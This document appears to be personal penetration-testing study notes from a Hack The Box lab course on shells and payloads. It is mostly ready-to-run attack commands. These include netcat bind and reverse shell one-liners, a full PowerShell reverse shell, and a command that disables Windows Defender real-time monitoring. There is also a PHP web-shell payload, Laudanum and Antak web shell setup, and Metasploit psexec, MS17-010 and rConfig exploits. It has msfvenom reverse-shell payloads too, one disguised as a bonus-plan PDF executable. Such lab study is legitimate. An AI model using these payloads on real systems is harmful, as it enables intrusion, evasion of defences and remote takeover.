# Terminal Emulator

| Terminal Emulator | Operating System          |
| ----------------- | ------------------------- |
| Windows Terminal  | Windows                   |
| cmder             | Windows                   |
| PuTTY             | Windows                   |
| kitty             | Windows, Linux, and MacOS |
| Alacritty         | Windows, Linux, and MacOS |
| xterm             | Linux                     |
| GNOME Terminal    | Linux                     |
| MATE Terminal     | Linux                     |
| Konsole           | Linux                     |
| Terminal          | MacOS                     |
| iTerm2            | MacOS                     |
#### Shell Validation From 'ps'
```shell
ps
```
#### Shell Validation Using 'env'
```shell
env
```
# Bind Shells
![[bindshell.png]]
#### No. 1: Server - Binding a Bash shell to the TCP session
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```
#### No. 2: Client - Connecting to bind shell on target
```shell
nc -nv 10.129.41.200 7777
```
# REVERSE SHELL
![[reverse-shell.png]]
## Simple Reverse Shell in Windows
#### Server (Attacker)
```shell
sudo nc -lvnp 443
```
#### Client (target)
###### Reverse Shell
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
###### Errors
```cmd
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
Disable AV (Powershell)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
#### Server (Attacker)
`[/htb]$ sudo nc -lvnp 443`
`Listening on 0.0.0.0 443`
`Connection received on 10.129.36.68 49674`
`PS C:\Users\htb-student> whoami`
`ws01\htb-student`
## Examples
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <VPN-IP>:<VPN-PORT> >/tmp/f"); ?>
```

```bash
nc -lvnp <VPN-PORT>
```
###### Upgrade Shell
```bash
which python3 | which python | which python2
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
# Web Shells
## PHP Web Shells
https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
## Laudanum
#### Move a Copy for Modification
```shell
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```
## Antak
#### Antak Directory
```shell
ls /usr/share/nishang/Antak-WebShell
```
#### Move a Copy for Modification
```shell
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```
# PAYLOADS
#### Netcat/Bash Reverse Shell One-liner
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
**/tmp/f**
- Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.
**mkfifo /tmp/f**
- Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.
**cat /tmp/f**
- Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).
**-i 2>&1**
- Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).
#### Open a Connection with Netcat
```shell
nc 10.10.14.12 7777 > /tmp/f  
```
#### Powershell One-liner
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
# Metasploit
#### NMAP Scan
```shell
nmap -sC -sV -Pn 10.129.164.25
```

```shell
sudo msfconsole 
search smb
```
###### `56 exploit/windows/smb/psexec`
```msf
use 56
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.222
exploit
```
#### Interactive Shell
```shell
meterpreter > shell
```
# MSFvenom
#### List Payloads
```shell
msfvenom -l payloads
```
## Staged
- `Staged` payloads create a way for us to send over more components of our attack. 
- We can think of it like we are "setting the stage" for something even more useful. 
- Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.
## Stageless
- `Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. 
- Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. 
- This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. 
- Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload.
## Stageless Payload
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
## Executing a Stageless Payload
```shell
sudo nc -lvnp 443
```
## Stageless Payload (Windows)
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
# Infiltrating Windows
### Enumerating Windows & Fingerprinting Methods
```shell
ping 192.168.86.39 
```

```shell
sudo nmap -sC -sV -Pn -O 10.129.201.97 --script banner.nse
```

```shell
nmap -v -A 10.129.201.97
```
### Determine an Exploit Path
```
msfconsole -q
```
#### Scan
```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```
#### Exploit
```
use windows/smb/ms17_010_psexec
options
set RHOSTS 10.129.201.97
set LHOST <ATTACKER>
exploit
```
# Infiltrating Unix/Linux
```shell
nmap -sC -sV 10.129.201.101
```

```shell
search rconfig
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
exploit
```
## Spawning a TTY Shell with Python
```shell
python -c 'import pty; pty.spawn("/bin/sh")' 
```
